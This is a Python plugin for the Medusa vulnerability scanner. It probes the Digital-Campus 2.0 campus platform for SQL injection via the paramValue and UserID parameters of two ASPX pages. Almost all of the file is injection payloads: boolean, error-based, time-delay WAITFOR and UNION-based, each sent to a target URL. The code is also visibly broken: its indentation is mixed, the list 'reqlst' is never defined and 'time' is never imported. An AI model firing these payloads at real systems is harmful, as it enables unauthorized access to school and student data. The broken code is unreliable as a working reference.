#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Digital-Campus2.0数字校园平台Sql注射
referer: http://www.wooyun.org/bugs/wooyun-2010-083652
author: Lucifer
modify: Ascotbe
description: 1./Code/Common/SystemCodeList.aspx文件中,参数paramValue未过滤导致SQL注入,泄露敏感数据。
             2./Code/Common/UpdateOnLine.aspx文件中,参数UserID未过滤导致SQL注入,泄露敏感数据。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload=''''''
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
	Medusas=[]
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
	payloads = [r"/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27AnD%271%27=%271&paramRturnValue=1",
				r"/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27AnD%271%27=%272&paramRturnValue=1"]
	for payload in payloads:
		payload_url = scheme+"://"+url+payload
		try:
			req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
			reqlst.append(str(req.text))
		except:
			pass
	if r"DayNum" in reqlst[0] and r"DayNum" in reqlst[1]:
        if len(reqlst[0]) != len(reqlst[1]):
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
			
	payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20AnD%201=CoNvErt(Int,@@version)--&paramRturnValue=1"
	payload_url = scheme+"://"+url+payload
	try:
		req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
		if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
	except:
		pass

	payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27;WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
	payload_url = scheme+"://"+url+payload
	start_time = time.time()
	try:
		req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
		if time.time() - start_time >= 6:
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
	except:
		pass

	payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
	payload_url = scheme+"://"+url+payload
	start_time = time.time()
	try:
		req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
		if time.time() - start_time >= 6:
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
	except:
		pass

	payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=-1%27%20UnIoN%20AlL%20SeLeCt%20CHAR(113)+CHAR(%2781dc9bdb52d04dc20036dbd8313ed055%27)+CHAR(113)+CHAR(118)+CHAR(113)+(CASE%20WHEN%20(CONCAT(NULL,NULL)=CONCAT(NULL,NULL))%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)--&paramRturnValue=1"
	payload_url = scheme+"://"+url+payload
	try:
		req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
		if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
	except:
		pass

	payload = "/Code/Common/UpdateOnLine.aspx?Method=UpdateOnLineStatus&UserID=1%27;WaItFoR%20DeLaY%20%270:0:6%27--"
	payload_url = scheme+"://"+url+payload
	start_time = time.time()
	try:
		req = requests.get(payload_url, headers=headers, timeout=10, verify=False)
		if time.time() - start_time >= 6:
			Medusa = "{} Digital-Campus数字校园平台SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
	except:
		pass
	return(Medusas)